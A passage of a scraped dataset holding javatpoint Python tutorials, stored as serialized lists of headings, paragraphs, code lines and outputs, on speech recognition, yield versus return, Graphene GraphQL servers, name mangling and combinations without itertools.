Thus, to capture the second phrase from the audio file, you can opt for 5 seconds or 3 seconds depending on your need using the below method."", 'The importance of duration and offset keyword fall for the segmentation of the file containing the audio. If you already know the audio frames, you can hastily fall for poor transcription results. To visualize this effect, use the following code by trying with the python interpreter.', 'No place is Noise free. All the speech recognition techniques have been developed to address and remove the unwanted Noise present in the speech that dampens the power of capturing the audio frames. Noise can wreck up the precision of applications. To understand how Noise impacts speech recognition, you need to download a file named ""jackhammer.wav"" and ensure to save it in your working directory of the interpreter. Assuming that this file has the phrase ""JavaTpoint is the best java training site"" spoken loudly, you need to transcribe it in the background. To do that, consider the below method.', 'The above code snippet misses the initial output, and the output is printed without the first word. Hence, when the record() method captures the audio, the first portion of the audio file is consumed, and the later data is captured. The adjust_for_ambient_noise() method reads the first second of the audio file and the Recognizer calibrates the noise level of the audio.', ""If you want to adjust the time frame using the adjust_for_ambient_noise(), you can use the duration keyword in your code snippet by assigning it the numerical value in seconds. If you don't assign any value, one is taken as a default value, but it is recommended to lower the value to 0.5. The following code snippet shows the same technique."", 'The above code snippet will return the whole audio file that you previously missed at the beginning. Although, there are some cases where it is very difficult to handle or remove the effect of Noise because the signal can be possibly too noisy to deal with.', 'Therefore, you may have to resort to some other techniques to pre-process the audio to deal with such an issue. To do that, you can use audio editing software or a Python package like SciPy. The package can pre-process the audio file and can filter the Noise.', 'Additionally, while working with noisy files, it is helpful that you use the actual API response since most of the API return JSON strings that have many transcriptions. Similarly, the recognize_google() method is bound to deliver similar transcripted files unless it is forced to deliver the full response. This method can be practically implemented using certain arguments and keywords like show_all that returns for the recognize_google() method.', 'In the above code snippet, the recognize_google() method returns a dictionary with an alternative key that points to various transcriptions shown above. Although the response structure may have different forms because of the variations from API to API, this is primarily used for debugging.', 'You can access your microphone using the SpeechRecognizer package by installing a package named PyAudio. To do that, save the changes as of now and close the interpreter. Go ahead and install the PyAudio with a similar process as you did with SpeechRecognizer.', 'The device index is defined in the above code is known as the index having the list of available microphone names on a system. For instance, in the above-given output, the microphone having the name ""front"" is positioned at index 3 in the list. This can be done using the method given below.', ""Another method that you will learn here is to listen () method used to capture input from the microphone. Since you have already created the microphone instance, it is the right time to capture some input. Like most of the AudioFile class, the microphone is also treated as a context manager. It captures the input through the Recognizer class having a block inside it by accepting it as the first argument and then recording input from the source until a moment where the microphone detects silence. To frame this out, let's see how it is applied using the given code."", 'Once the above code is executed with the block, you should try speaking something into the microphone and wait for some time. The interpreter might prompt to display after some time. Once you see "">>>"" as returned prompt, it is assured that the Recognizer can recognize whatever you say.', 'To adjust the Noise prevailing in your speech, you may need to use the same method of adjust_for_ambient_noise() of the Recognizer class. Since the microphone input is unpredictable compared to the audio file, it is always a good idea to always do these while listening to the microphone input. To get precise and noise-free output, you can try it with the listen() method as shown.', 'When the run the above code, wait for few seconds so that the adjust_for_ambient Noise () method does its tasks. After the code is compiled and run, try speaking something into the microphone and wait for the interpreter to recognize the speech. If it recognizes and returns the prompt, it is working fine.', ""You can also use the duration keyword and try to use it again for getting a particular frame of the speech you want to be recognized. Meanwhile, the SpeechRecognizer documentation recommends using the duration keyword if the duration keyword has duration of 0.5 or less. You might also find that the duration keyword is not used in some cases, and hence one is used as the default value for generating better results. Also, it is notably possible that the minimum value is dependent on the input by the microphone's environment. Hence, the duration of one second is preferably considered best for this kind of task."", 'This error is because of the unrecognized nature of the speech captured through the microphone as input, and hence the API codebase is not advanced enough to transcribe these short grunt noises or vocal sounds. There might also be the case that the interpreter may prompt by recognizing the current input and displaying something not even close to what is captured through the microphone. Hence, the activities like clapping, clicks, or other bars might raise an exception or no correct output, respectively.', 'In this long tutorial about speech recognition in Python, you learned how the schedule works from scratch. You covered from conceptual knowledge to hands-on experience in creating a real-time and simple python speech recognizer that can hear your speech and display it in the textual format on the console. You also learned some of the critical methods to deal with the issue that commonly occurred while using the SpeechRecognizer package and learned how to rectify these issues. Python being widely-used programming and scripting language covers most speech recognition applications because of its ambient libraries and frameworks that display its ability to handle critical problems with just a few lines of easy and readable codes.']","['$ pip install SpeechRecognition', '>>> import speech_recognition as sr', "">>> sr._version_'3.8.1'"", '>>> r=sr.Recognizer()', 'recognize_bing(): Microsoft Bing Speech', 'recognize_google(): Google Web Speech API', 'recognize_google_cloud(): Google Cloud Speech - requires', 'installation of the google-cloud-speech package', 'recognize_houndify(): Houndify by SoundHound', 'recognize_ibm(): IBM Speech to Text', 'recognize_sphinx(): CMU Sphinx - requires installing PocketSphinx', 'recognize_wit(): Wit.ai', 'Traceback (most recent call last):', 'File """", line 1, in', ""TypeError: recognize_google() missing 1 required positional argument: 'audio_data'"", "">>> hardvard = sr.AudioFile('harvard.wav')"", '>>> with harvard as source:', 'Audio = r.record(source)', '>>> type(audio)', '>>> r.recognize_google(audio)', '>>> with harvard as source:', 'Audio = r.record(source, duration=5)', '>> >r.recognize_google(audio)', '>>> with harvard as source:', '...     audio1 = r.record(source, duration=4)', '...     audio2 = r.record(source, duration=4)', '>>> r.recognize_google(audio1)', ""'the stale smell of old beer lingers'"", '>>> r.recognize_google(audio2)', ""'it takes heat to bring out the odor a cold dip.'"", '>>> with harvard as source:', '...     audio = r.record(source, offset=4, duration=3)', '>>> r.recognize_google(audio)', '>>> with harvard as source:', '...     audio = r.record(source, offset=4.7, duration=2.8)', '>>> r.recognize_google(audio)', "">>> jackhammer = sr.AudioFile('jackhammer.wav')"", '>>> with jackhammer as source:', '...     audio = r.record(source)', '>>> r.recognize_google(audio)', '>>> with jackhammer as source:', '...     r.adjust_for_ambient_noise(source)', '...     audio = r.record(source)', '>>> r.recognize_google(audio)', '>>> with jackhammer as source:', '...     r.adjust_for_ambient_noise(source, duration=0.5)', '...     audio = r.record(source)', '>>> r.recognize_google(audio)', '>>> r.recognize_google(audio, show_all=True)', ""{'alternative': ["", ""{'transcript': 'javatpoint best is the programming site'},"", ""{'transcript': 'the javatpoint site is best programming'},"", ""{'transcript': 'javatpoint programming is the best site'},"", ""{'transcript': 'the programming is javatpoint best site'},"", ""{'transcript': 'best is the programming site javatpoint'},"", ""], 'final': True}"", '$ pip install pyaudio', '$ python -m speech_recognizer', 'A moment of silence, please?', 'Set minimum energy threshold to 600.4452854381937', 'Say something!', '>>> import speech_recognizer as sr', '>>> r.=sr.Recognizer()', '>>> mic = sr.Microphone()', '>>> sr.Microphone.list_microphone_names()', ""['HDA Intel PCH: ALC272 Analog (hw:0,0)',"", ""'HDA Intel PCH: HDMI 0 (hw:0,3)',"", ""'sysdefault',"", ""'front',"", ""'surround40',"", ""'surround51',"", ""'surround71',"", ""'hdmi',"", ""'pulse',"", ""'dmix',"", ""'default']"", '>>> mic = sr.Microphone(device_index=3)', '>>> with mic as source:', '...     audio = r.listen(source)', '>>> with mic as source:', '...     r.adjust_for_ambient_noise(source)', '...     audio = r.listen(source)', 'Traceback (most recent call last):', 'File """", line 1, in', 'File', '""/home/david/real_python/speech_recognition_primer/venv/lib/pyth', 'on3.5/site-packages/speech_recognition/__init__.py"", line 858, in recognize_google', 'if not isinstance(actual_result, dict) or', 'len(actual_result.get(""alternative"", [])) == 0: raise', 'UnknownValueError()', 'speech_recognition.UnknownValueError']",[],[],['|||Assembly|||Apia|||SpeechRecognition|||Wit|||Watson-developer-cloud||||||WAV: format must be in PCM/LPCM|||AIFF|||AIFF-C|||FLAC: format must be native FLAC|||']
272,['Difference between Yield and Return in Python'],"['The generators are defined by using the yield statement in Python. Generally, it converts a normal Python function into a generator.']","['https://www.javatpoint.com/graphene-python', 'https://www.javatpoint.com/speech-recognition-python', 'https://www.javatpoint.com/graphene-python', 'https://www.javatpoint.com/speech-recognition-python', 'https://www.javatpoint.com/graphene-python']",[],[],[],"['Python Yield statement', 'What is Generator?', 'Python Return Statement', 'Difference between yield and return Statement', 'Conclusion']",[],"['Example 1:', 'Example 2:', 'Example 1:', 'Example 2:']","['Python generators are used as a method for generating the iterators. Generators have automatically handled the task. A generator can be defined as the special function that returns an object of the generator to the caller.', 'In simple words, a generator is referred to the function that returns an iterator that we can iterate upon. In Python, it is very easy to create a generator and it uses the yield statement instead of the return statement.', 'In the above article, we have seen the differences in the return and yield statements. Also, we have understood the concepts of both statements and know how to use them in our Python programs.']","['The yield statement hauls the function and returns back the value to the function caller and restart from where it is left off. The yield statement can be called multiple times. While the return statement ends the execution of the function and returns the value back to the caller. The function returns nothing without it. In Python generators, the yield function is used for replacing the return function that sends back the value to the user without ruining local variables.', 'The return statement is generally used for the execution ending and returns the value back to the caller. The return statement can return all types of values and it returns nothing when there is no expression passed to return statement. There can be multiple return statements in a function but only a single statement is called for any specified invocation of the function.', 'We can see a return statement is placed at the end of the block of the function for returning the final output of the execution of all statements inside the function. Also, it can be seen earlier in the block of the function for stopping the execution of all consequent statements in the block. The execution of the program at the caller is quickly restarted with a return statement. It returns none when no value is specified.']","['# Python Code for using yield statement', 'def myfunction(a, b):', 'add = a + b', 'yield add', 'sub = a - b', 'yield sub', 'mul = a * b', 'yield mul', 'div = a % b', 'yield div', '# generator runs with for loop for getting all values', 'for value in myfunction(49,45):', 'print(value)', '# Python code for using the yield statement', 'def printoutput(String) :', 'for i in String:', 'if i == ""a"":', 'yield i', '# string initialization', 'String = ""Tutorial and examples""', 'ans = 0', 'print (""The number of \'a\' in the string is : "", end = """" )', 'String = String.strip()', 'for j in printoutput(String):', 'ans = ans + 1', 'print (ans)', '# Python code for', '#demonstrating use of return statement', 'def myfunc(a, b):', 'add = a + b', 'sub = a - b', 'mul = a * b', 'div = a % b', 'return(add, sub, mul, div)', '# Getting return value and printing the output', 'output = myfunc(49,45)', 'print(""Addition: "", output[0])', 'print(""Subtraction: "", output[0])', 'print(""Multiplication: "", output[0])', 'print(""Division: "", output[0])', '# Python code for', '#demonstrating use of return statement', 'class check:', 'def __init__(self):', 'self.str = ""Tutorial and examples""', 'self.x = ""Kaushal""', '# Object of test will be returned by this function', 'def fun():', 'return check()', '# Driver code for checking the above method', 't = fun()', 'print(t.str)', 'print(t.x)']","['94', '4', '2205', '1.08', ""The number of 'a' in the string is : 3"", 'Addition: 94', 'Subtraction: 4', 'Multiplication: 2205', 'Division: 1.08', 'Tutorial and examples', 'Kaushal']",['Yield Statement|||Return Statement&&&Yield returns the generator object.|||Returns the results to the caller.&&&It can run multiple times.|||It runs only a single time.&&&Code can be executed in the next function call after the yield statement.|||Code will not be executed after the return statement.&&&This statement can resume from where it is left off or paused.|||The function call in this statement only runs the function from the beginning.&&&The yield statement hauls the function and returns back the value to the function caller.|||The return statement takes exit from the execution and returns the value back to the caller.'],[]
273,['Graphene Python'],"['Python is considered among the most beloved general-purpose programming languages because of its ease of utilization and simplicity. In addition to it, GraphQL, a declarative query language for Application Programming Interfaces and server runtimes, pairs pretty well with Python. However, a very small number of comprehensive learning materials are available out there that provide the programmers a step-by-step breakdown on the utilization of GraphQL with Python.']","['https://www.javatpoint.com/name-mangling-in-python', 'https://www.javatpoint.com/yield-vs-return-in-python', 'https://www.javatpoint.com/name-mangling-in-python', 'https://www.javatpoint.com/yield-vs-return-in-python', 'https://www.javatpoint.com/name-mangling-in-python']",[],[],"['Objective', 'Setting up the environment', 'Crawling and Extraction', 'Schema', 'Server', 'Client', 'Introspection']",[],[],"['In the following tutorial, we will focus on the use of GraphQL with Python using the Graphene library.', 'But before we get into that, let us briefly discuss the goal and requirements for the tutorial.', 'We will build a project based on a crawling service. We will use the extraction library for this project.', 'This crawling service will submit the client request in the following way:', 'The response from the server will be:', 'Each website will also involve a description field.', 'Let us activate the virtual environment.', 'The syntax for Windows, MacOS, and Linux is quite different.', '1. For Windows:', '2. For MacOS / Linux:', 'Now, let us understand what the required libraries for the project are.', 'We can install them individually, using the pip installer as shown below.', 'We can install them as a group as shown below:', 'Before we get started with GraphQL, let us briefly understand the following snippet of code for crawling and extracting data from a website.', 'Explanation:', 'In the above snippet of code, we have imported the required libraries and defined a function for extraction as extract().', 'function of the extraction module to extract the required data for the user and printed them for the user.', 'At last, we have called the extract() function specifying the URL we want to extract the data from.', 'We can observe that every extracted object generates different sections of data available such as title, url, image, description, and feed.', 'We can write a schema for describing an extracted website in a quite simple way, as shown below:', 'Explanation:', 'The thing which is quite unexpected is that we also need to write a schema describing the query we will make in order to retrieve these objects:', 'Explanation:', 'With that done, we have created the schema for the project successfully.', 'The complete code for same is shown below:', 'File: my_schema.py', 'Now that we have written the schema, we can begin serving it over HTTP with the help of flask and flask-graphql.', 'Let us consider the following snippet of code in order to create a server.', 'File: my_server.py', 'Explanation:', 'Now we can run the server using the following syntax:', 'Once we entered the above syntax, the server will begin running at localhost:5000 or http://127.0.0.1:5000/.', 'The output for the same is shown below:', 'File: my_client.py', 'Explanation:', 'The server reply would be:']","['With the hypothesis that we already have Python version 3 available locally, let us first create a virtual environment for the dependencies. In order to create one, let us begin with installing virtualenv as shown below:', 'Inside the function, we have used the requests module to request the details from the URL and stored those details in the variable named myhtml. We have then used the Extractor()', 'GraphQL scheme is present at the base of each API of GraphQL. It helps in describing the types, fields, objects for the exposed API. We utilize the Graphene library in order to describe the schema as an object in Python.', 'In the above snippet of code, website1 is an object type that we support querying against, my_url is a parameter that we will pass along to the resolution function, and then the website1 object calls the resolv_website function by each request.', 'The last step is to create an instance of graphene.Schema, which we will pass to the server in order to describe the new API we have created. Let us consider the following snippet of code for the same.', 'Even though they exist, we do not require a special GraphQL client in order to perform API requests against the new API; we can stick to the HTTP clients that we are used to, with us utilizing requests in the following example.', 'One can also customize the contents of the my_query variable in order to retrieve various fields or even utilize things such as aliases in order to retrieve more than one object at a time.', 'Among the most powerful aspects of GraphQL, its servers support introspection. Introspection allows both humans as well as automated tools in order to understand the available objects and operations.', 'One of the good examples of this can be that while we are running the example we built, we can navigate to http://127.0.0.1:5000 and utilize GraphiQL in order to test the new API directly.', 'Many other queries based on introspection are available, which are quite clumsy to write; however, they depict a tremendous amount of power to tool builders.']","['Graphene is among the best libraries to create the endpoints of GraphQL in a programming language like Python. It is dynamically advanced. It contains reasonably entire helper libraries for ORM of Django, SQLAlchemy, and MongoDB. It is considerably effortless to achieve something simple going. The Documentation of Graphene leaves a lot to be desired. It is easy to achieve something simple going in GraphQL with the help of its documentation; however, getting something hardened, production-ready, and capable is another story.', 'In the above snippet of code, we have imported the graphene library and defined a class as myWebsite that inherits the ObjectType class of the graphene library. This ObjectType acts as a building block utilized in order to define the relationship between the Fields in the Schema and the way of retrieving their data. Inside the class, we have defined different fields and used the String() of the graphene library to describe the types of fields; however, each field could be another object we have described or several other lists, scalars, enums, and many more.', 'In the above snippet of code, we have imported the required libraries in addition to the file named my_schema that we created earlier. We have then used the Flask() function specifying the parameter as __name__ to create the application. We have also added different rules for the URL using the add_url_rule() function, where we have specified different parameters and used the run() function at last to execute the application.', 'In the above snippet of code, we have imported the requests library and defined a query as my_query that will be sent to the server. We have then defined a variable as my_response, which will store the data returned in the form of a response from the server. At last, we have printed the response for the user.', 'These capabilities are not restricted to GraphiQL, and the integration can also be done by us with the help of the same query interface we would utilize to query the new API. Let us consider a simple example where we ask about the available queries exposed by the sample service:']","['website(url: ""https://www.javatpoint.com/python-tutorial"") {', 'title', 'image', '""data"": {', '""website"": {', '""title"": ""Learn Python Tutorial - javatpoint"",', '""image"": ""https://static.javatpoint.com/images/logo/jtp_logo"",', '}', '$ pip install virtualenv', '$ virtualenv env', '$ env\\Scripts\\activate', '$ source env/bin/activate', '$ pip install extraction', '$ pip install graphene', '$ pip install flask-graphql', '$ pip install requests', '$ pip install extraction graphene flask-graphql requests', '# importing the required libraries', 'import graphene', 'import extraction', 'import requests', '# defining the function for extraction', 'def extract(myurl):', 'myhtml = requests.get(myurl).text', 'extrctd = extraction.Extractor().extract(myhtml, source_url = myurl)', 'print(extrctd)', '# calling the function', ""extract('https://www.javatpoint.com/python-tutorial')"", '# importing the graphene library', 'import graphene', '# defining a class', 'class my_Website(graphene.ObjectType):', 'my_url = graphene.String(required = True)', 'my_title = graphene.String()', 'my_description = graphene.String()', 'my_image = graphene.String()', '# importing the graphene library', 'import graphene', '# defining the class', 'class my_Query(graphene.ObjectType):', 'website1 = graphene.Field(my_Website, my_url = graphene.String())', '# defining the function', 'def resolv_website(self, info, my_url):', 'extrctd = extract(my_url)', 'return my_Website(my_url = my_url,', 'my_title = extrctd.title,', 'my_description = extrctd.description,', 'my_image = extrctd.image,', ')', 'my_schema = graphene.Schema(query = my_Query)', '# importing the required libraries', 'import graphene', 'import extraction', 'import requests', '# defining the function for extraction', 'def extract(my_url):', 'myhtml = requests.get(my_url).text', 'extrctd = extraction.Extractor().extract(myhtml, source_url = my_url)', 'print(extrctd)', 'return extrctd', '# defining the class', 'class my_Website(graphene.ObjectType):', 'my_url = graphene.String(required = True)', 'my_title = graphene.String()', 'my_description = graphene.String()', 'my_image = graphene.String()', '# defining the class', 'class my_Query(graphene.ObjectType):', 'website1 = graphene.Field(my_Website, my_url = graphene.String())', '# defining the function', 'def resolv_website(self, info, my_url):', 'extrctd = extract(my_url)', 'return my_Website(my_url = my_url,', 'my_title = extrctd.title,', 'my_description = extrctd.description,', 'my_image = extrctd.image,', ')', 'my_schema = graphene.Schema(query = my_Query)', '# importing the required library', 'from flask import Flask', 'from flask_graphql import GraphQLView', 'import my_schema', '# using the Flask() function to create app', 'my_app = Flask(__name__)', '# setting URL rules', 'my_app.add_url_rule(', ""view_func = GraphQLView.as_view('graphql', schema = my_schema, graphiql = True)"", 'my_app.run()', '$ python my_server.py', '# importing the requests library', 'import requests', '# defining the query', 'my_query = """"""', 'website(url: ""https://www.javatpoint.com/python-tutorial"") {', 'title', 'image', 'description', '# defining the response', 'my_response = requests.post(""http://127.0.0.1:5000/"", params = {\'query\': my_query})', 'print(my_response.text)', '__type(name: ""Query"") {', 'fields {', 'name', 'args {', 'name', '}']","['created virtual environment CPython3.9.0.final.0-64 in 45108ms', 'creator CPython3Windows(dest=D:\\Python\\env, clear=False, no_vcs_ignore=False, global=False)', 'seeder FromAppData(download=False, pip=bundle, setuptools=bundle, wheel=bundle, via=copy, app_data_dir=C:\\Users\\Mango\\AppData\\Local\\pypa\\virtualenv)', 'added seed packages: pip==21.2.2, setuptools==57.4.0, wheel==0.36.2', 'activators BashActivator,BatchActivator,FishActivator,PowerShellActivator,PythonActivator', 'Serving Flask app ""my_server"" (lazy loading)', '* Environment: production', 'WARNING: This is a development server. Do not use it in a production deployment.', 'Use a production WSGI server instead.', '* Debug mode: off', '* Running on http://127.0.0.1:5000/ (Press CTRL+C to quit)', '{', '""data"": {', '""website"": {', '""title"": ""Learn Python Tutorial - javatpoint"",', '""image"": ""https://static.javatpoint.com/images/logo/jtp_logo"",', '""description"": ""Learn Python Tutorial for beginners and profession""', '}', '}', '}', '{', '""data"": {', '""__type"": {', '""fields"": [', '{', '""name"": ""website"",', '""args"": [{ ""name"": ""url"" }]', '}', ']', '}', '}', '}']",[],['|||Extraction|||Graphene|||Flask-graphql|||Requests|||']
274,['Name Mangling in Python'],"['In this tutorial, we are going to discuss the name mangling process in Python and how we can use the name mangling process in Python with different methods.']","['https://www.javatpoint.com/python-combination-without-itertools', 'https://www.javatpoint.com/graphene-python', 'https://www.javatpoint.com/python-combination-without-itertools', 'https://www.javatpoint.com/graphene-python', 'https://www.javatpoint.com/python-combination-without-itertools']",[],[],"['Name Mangling', 'Name Mangling in Python']","['Illustration:', 'Example:', 'Note: If we try to access the functions and variables of the Testing class outside the class, it will throw an error. Any changes made to the variable given inside the Testing Class can be done inside the class only.\nExample: 2\n\r\n# A testing class for identifier\r\nclass Testing: \r\n    # Giving Name as an identifier\r\n    def __init__(self, name):\r\n         # Identifier initializing with double underscore\r\n        self.__name = name \r\n    def PrintName(self): \r\n        print(self.__name) \r\nt1 = Testing(""JavaTpoint"") # Calling variable name with the class\r\nt1.PrintName() # Printing name in the output\r\n# Accessing identifier outside the class\r\nprint(t1.__name) # will throw an error in the output\r\n\nOutput:\nJavaTpoint\r\nTraceback (most recent call last):\r\n  File ""C:\\Users\\Manish\\Downloads\\code.py"", line 12, in \r\n    print(t1.__name) # will throw an error in the output\r\nAttributeError: \'Testing\' object has no attribute \'__name\'\r\n\nName Mangling in Python\nImplementation of the name mangling process in Python is the same as we have discussed above. We will use different methods in our Python program to implement the name mangling process and accessing variables in it.\nWe will perform the following tasks in this section:\n\nName mangling in Python with dir() method\nAccessing Name mangled variables in the program\nName mangling with method overriding in Python\n\nWe will use a program for each method to understand its implementation in Python.\n1. Name mangling with dir() method\nWe can use the dir() method to perform the name mangling process, and it will be done to a class given in the code. The Python interpreter will do the process of name mangling to the class. We can use the dir() method by passing the defined class object in it, and the dir() method will return all the valid attributes belonging to the given class object.\nLook at the following exemplar program to understand this dir() method of name mangling:\nExample:\n\r\n# A testing class for name mangling\r\nclass Testing: \r\n    def __init__(self, name): \r\n        self.__name = name\r\n# Initializing variable with the testing class\r\nt1 = Testing(""JavaTpoint"")\r\n# Using dir() method on initialized variable\r\nprint(dir(t1))\r\n\nOutput:\n[\'_Testing__name\', \'__class__\', \'__delattr__\', \'__dict__\', \'__dir__\', \'__doc__\', \'__eq__\', \'__format__\', \'__ge__\', \'__getattribute__\', \'__gt__\', \'__hash__\', \'__init__\', \'__init_subclass__\', \'__le__\', \'__lt__\', \'__module__\', \'__ne__\', \'__new__\', \'__reduce__\', \'__reduce_ex__\', \'__repr__\', \'__setattr__\', \'__sizeof__\', \'__str__\', \'__subclasshook__\', \'__weakref__\']\r\n\nExplanation:\nAs we look at the output, we can see that the dir() method we used on the initialized variable, i.e., t1, returned all the valid attributes of the class testing and printed them. We can also see that the name of the identifier, i.e., __name, is changed to _Testing__name by the interpreter.\n2. Accessing name mangled variables\nWe can access the name mangled variables even outside the class and print the in output (Not like accessing the class variable that will return an error). To access the name mangled variables outside the class, we simply have to add _ClassName with the variable, and we can also print the value in the output.\nLook at the following program where we have accessed name mangled variables outside the testing class.\nExample:\n\r\n# A testing class for name mangling\r\nclass Testing: \r\n    def __init__(self, name): \r\n          self.__name = name\r\n# Initializing variable with the testing class\r\nt1 = Testing(""JavaTpoint"")\r\n# Accessing Name mangled variables outside testing class\r\nprint(""The name mangled that we are accessing outside the class: "", t1._Testing__name)\r\n\nOutput:\nThe name mangled that we are accessing outside the class:  JavaTpoint\r\n\nExplanation:\nWe have been able to access the __name variable outside as it was a name mangled variable, and it returned the name value in the output.\n3. Name mangling using method overriding\nAs we are using the name mangling process in our program, we are limited because of little support for a valid use case of members from a private class. The limited support for the private class member\'s valid use case is to avoid name clashes of various names with names defined inside the subclasses. As long as the name mangling process will occur as per the definition of a Python class, the mangling process will be done by the interpreter. And, it is very helpful for the subclasses in the program to let them override methods without even breaking calls of the interclass method.\nLet\'s understand the following example.\nExample:\n\r\n# A default testing class for name mangling\r\nclass Testing:  \r\n    def __init__(self):  \r\n        self.__jtp()  # name mangling with the Jtp variable\r\n    def jtp(self):  # default function for name mangling in parent class\r\n        print(""Name mangling process done inside the parent testing class"")  \r\n    # copy of jtp() method for private class members\r\n    __jtp = jtp     # Name mangling with method overriding process\r\n# A subclass for Testing class\r\nclass SubTesting(Testing):  \r\n    # Providing new signature for jtp() function\r\n    def jtp(self):          \r\n        print(""Name mangling process done inside the child sub-testing class"") \r\n# Calling the objects from subclass and function of it \r\nobj = SubTesting() \r\nobj.jtp()\r\n\nOutput:\nName mangling process done inside the parent testing class\r\nName mangling process done inside the child sub-testing class\r\n\nConclusion\nFirst, we have learned about the introduction of the Name mangling process in this tutorial. We also learned that how we can use the dir() method for name mangling in Python. Then, we accessed the name mangled variables outside the class in which they are present. In last, we also learn about that how we can use the name mangling process with method overriding in given subclasses in the program.\n\n\nNext TopicPython combination without itertools\n\n\n\n← prev\nnext →\n\n\n', 'Example: 2', '1. Name mangling with dir() method', 'Example:', '2. Accessing name mangled variables', 'Example:', '3. Name mangling using method overriding', 'Example:', 'Conclusion']",[],"['Look at the following example to understand the name mangling process.', 'Explanation:', 'We will perform the following tasks in this section:', 'We will use a program for each method to understand its implementation in Python.', 'Look at the following exemplar program to understand this dir() method of name mangling:', 'Explanation:', 'Look at the following program where we have accessed name mangled variables outside the testing class.', 'Explanation:', 'We have been able to access the __name variable outside as it was a name mangled variable, and it returned the name value in the output.', ""Let's understand the following example.""]","['We have defined a testing class with a name identifier in the class in the above program. Inside the testing class, we have defined two default functions and one with the PrintName().', 'In the PrintName() function, we have given the print command to print the name. Then, we initialized a t1 variable with the testing class. In last, we have used PrintName() to print the name we used in the Testing class while initializing it.', 'Implementation of the name mangling process in Python is the same as we have discussed above. We will use different methods in our Python program to implement the name mangling process and accessing variables in it.']","['A process in which any given identifier with one trailing underscore and two leading underscores is textually replaced with the __ClassName__Identifier is known as Name mangling. In __ClassName__Identifier name, ClassName is the name of current class where identifier is present.', 'Basically, above given definition of name mangling means that any identifier in the form such as __Jtp (Either at least two leading underscores or at most one underscore trailing the name) will be replaced by __ClassName__Jtp (the name of the current class will replace ClassName) with the leading underscore (s) striped in ClassName.', 'We can use the dir() method to perform the name mangling process, and it will be done to a class given in the code. The Python interpreter will do the process of name mangling to the class. We can use the dir() method by passing the defined class object in it, and the dir() method will return all the valid attributes belonging to the given class object.', 'As we look at the output, we can see that the dir() method we used on the initialized variable, i.e., t1, returned all the valid attributes of the class testing and printed them. We can also see that the name of the identifier, i.e., __name, is changed to _Testing__name by the interpreter.', 'We can access the name mangled variables even outside the class and print the in output (Not like accessing the class variable that will return an error). To access the name mangled variables outside the class, we simply have to add _ClassName with the variable, and we can also print the value in the output.', ""As we are using the name mangling process in our program, we are limited because of little support for a valid use case of members from a private class. The limited support for the private class member's valid use case is to avoid name clashes of various names with names defined inside the subclasses. As long as the name mangling process will occur as per the definition of a Python class, the mangling process will be done by the interpreter. And, it is very helpful for the subclasses in the program to let them override methods without even breaking calls of the interclass method."", 'First, we have learned about the introduction of the Name mangling process in this tutorial. We also learned that how we can use the dir() method for name mangling in Python. Then, we accessed the name mangled variables outside the class in which they are present. In last, we also learn about that how we can use the name mangling process with method overriding in given subclasses in the program.']","['# A testing class for identifier', 'class Testing:', '# Giving Name as an identifier', 'def __init__(self, name):', '# Identifier initializing', 'self.__name = name', 'def PrintName(self):', 'print(self.__name)', 't1 = Testing(""JavaTpoint"") # Calling variable name with the class', 't1.PrintName() # Printing name in the output', '# A testing class for identifier', 'class Testing:', '# Giving Name as an identifier', 'def __init__(self, name):', '# Identifier initializing with double underscore', 'self.__name = name', 'def PrintName(self):', 'print(self.__name)', 't1 = Testing(""JavaTpoint"") # Calling variable name with the class', 't1.PrintName() # Printing name in the output', '# Accessing identifier outside the class', 'print(t1.__name) # will throw an error in the output', '# A testing class for name mangling', 'class Testing:', 'def __init__(self, name):', 'self.__name = name', '# Initializing variable with the testing class', 't1 = Testing(""JavaTpoint"")', '# Using dir() method on initialized variable', 'print(dir(t1))', '# A testing class for name mangling', 'class Testing:', 'def __init__(self, name):', 'self.__name = name', '# Initializing variable with the testing class', 't1 = Testing(""JavaTpoint"")', '# Accessing Name mangled variables outside testing class', 'print(""The name mangled that we are accessing outside the class: "", t1._Testing__name)', '# A default testing class for name mangling', 'class Testing:', 'def __init__(self):', 'self.__jtp()  # name mangling with the Jtp variable', 'def jtp(self):  # default function for name mangling in parent class', 'print(""Name mangling process done inside the parent testing class"")', '# copy of jtp() method for private class members', '__jtp = jtp     # Name mangling with method overriding process', '# A subclass for Testing class', 'class SubTesting(Testing):', '# Providing new signature for jtp() function', 'def jtp(self):', 'print(""Name mangling process done inside the child sub-testing class"")', '# Calling the objects from subclass and function of it', 'obj = SubTesting()', 'obj.jtp()']","['JavaTpoint', 'JavaTpoint', 'Traceback (most recent call last):', 'File ""C:\\Users\\Manish\\Downloads\\code.py"", line 12, in', 'print(t1.__name) # will throw an error in the output', ""AttributeError: 'Testing' object has no attribute '__name'"", ""['_Testing__name', '__class__', '__delattr__', '__dict__', '__dir__', '__doc__', '__eq__', '__format__', '__ge__', '__getattribute__', '__gt__', '__hash__', '__init__', '__init_subclass__', '__le__', '__lt__', '__module__', '__ne__', '__new__', '__reduce__', '__reduce_ex__', '__repr__', '__setattr__', '__sizeof__', '__str__', '__subclasshook__', '__weakref__']"", 'The name mangled that we are accessing outside the class:  JavaTpoint', 'Name mangling process done inside the parent testing class', 'Name mangling process done inside the child sub-testing class']",[],['|||Name mangling in Python with dir() method|||Accessing Name mangled variables in the program|||Name mangling with method overriding in Python|||']
275,['Python combination without itertools'],['There are many instances when we have to find different combinations from single strings or a different set of numbers.'],"['https://www.javatpoint.com/python-comprehensions', 'https://www.javatpoint.com/name-mangling-in-python', 'https://www.javatpoint.com/python-comprehensions', 'https://www.javatpoint.com/name-mangling-in-python', 'https://www.javatpoint.com/python-comprehensions']",[],[],['Combinations in Python without using itertools'],"['Python combinations using iteration method:', 'Example:', 'Python combinations using recursion method:', 'Example:']",[],"['To find such combinations in Python, we have the itertools module, the most common for finding different combinations and permutations.', ""To implement the iterative approach in the program, we have to import numpy library to use its functions. Let's understand the following example."", 'Explanation:', 'We have used the iteration method in the above program to find combinations from the input string.', 'After that, we used arrange() function of numpy to set the index for the tuple. We are going to iterate over tuple with the index variable.', 'Then, we have taken an input string from the user. In the last, we returned combinations of three sets from the input string.', ""In the Recursive method approach, we will iterate over the list by that consists of list of strings. Let's understand the following example."", 'Explanation:']","['This module is a very efficient tool and works very fast to find all the possible combinations. But itertools module functions are not the only possible method that we can use to find the combinations.', 'In this tutorial, we will learn about the different methods by which we can find different combinations from a string in Python without using itertools.', 'In this section, we will write Python programs to find combinations by implementing several methods in them. We will use the following methods in our Python program:', ""In both methods, first, we will look at the program and understood it's working, and then we will move to the explanation part to understand the implementation used in it."", 'Then, we iterated over the tuple using reverse for loop and another for loop inside the while loop. After the iteration in loops, we have yielded the possible combinations of the required 